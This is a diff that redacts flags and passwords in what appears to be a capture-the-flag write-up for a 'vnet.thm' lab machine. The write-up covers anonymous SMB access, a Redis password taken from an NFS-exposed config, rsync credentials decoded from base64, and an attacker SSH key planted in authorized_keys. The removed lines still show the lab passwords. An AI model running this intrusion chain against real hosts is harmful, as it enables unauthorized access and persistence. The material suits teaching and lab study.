@@ -58,7 +58,7 @@ smb: \> ls
 
 smb: \> cd temp
 smb: \temp\> more services.txt
-REDACTED
+[flag_redacted]
 ```
 
 The `shares` share allows anonymous access. The `temp` directory contains the first flag. The `data` directory contains `data.txt` and `business-req.txt` — informational content with no useful credentials.
@@ -105,7 +105,7 @@ Redis (port 6379) — in-memory key-value store commonly used for caching and se
 ```bash
 cat /tmp/nfs/redis/redis.conf | grep pass
 
-requirepass "B65Hx562F@ggAZ@F"
+requirepass "[redis_password_redacted]"
 ```
 
 Redis credential found in the configuration file exposed via NFS.
@@ -117,7 +117,7 @@ Redis credential found in the configuration file exposed via NFS.
 With the obtained credential, Redis is accessed to enumerate all stored keys. Redis is exploited here as a source of sensitive information: it contains an internal flag and rsync credentials encoded in base64.
 
 ```bash
-redis-cli -h <TARGET_IP> -a 'B65Hx562F@ggAZ@F'
+redis-cli -h <TARGET_IP> -a '[redis_password_redacted]'
 
 vnet.thm:6379> INFO KEYSPACE
 # Keyspace
@@ -131,10 +131,10 @@ vnet.thm:6379> KEYS *
 5) "tmp"
 
 vnet.thm:6379> get "internal flag"
-"REDACTED"
+"[flag_redacted]"
 
 vnet.thm:6379> LRANGE authlist 0 -1
-1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+1) "QXV0aG9yaXphdGlvbiBmb3Ig....."
 ```
 
 | Switch | Description |
@@ -143,9 +143,9 @@ vnet.thm:6379> LRANGE authlist 0 -1
 | `-a` | Authentication password |
 
 ```bash
-echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
+echo "QXV0aG9yaXphdGlvbiBmb3Ig..." | base64 -d
 
-Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+Authorization for rsync://rsync-connect@127.0.0.1 with password [rsync_password_redacted]
 ```
 
 List-type keys require `LRANGE` instead of `GET`. The `authlist` key contained rsync credentials encoded in base64.
@@ -172,7 +172,7 @@ drwxr-xr-x  4,096 ubuntu
 ```
 
 ```bash
-RSYNC_PASSWORD='Hcg3HP67@TW@Bc72v' rsync -av rsync://rsync-connect@<TARGET_IP>/files/sys-internal /tmp/rsync/
+RSYNC_PASSWORD='[rsync_password_redacted]' rsync -av rsync://rsync-connect@<TARGET_IP>/files/sys-internal /tmp/rsync/
 ```
 
 | Switch / Variable | Description |
@@ -200,7 +200,7 @@ ssh-keygen -t rsa -f /tmp/id_rsa_vulnet -N ""
 ```bash
 cp /tmp/id_rsa_vulnet.pub /tmp/rsync/sys-internal/.ssh/authorized_keys
 
-RSYNC_PASSWORD='Hcg3HP67@TW@Bc72v' rsync -av /tmp/rsync/sys-internal/.ssh/ \
+RSYNC_PASSWORD='[rsync_password_redacted]' rsync -av /tmp/rsync/sys-internal/.ssh/ \
   rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/
 
 sending incremental file list
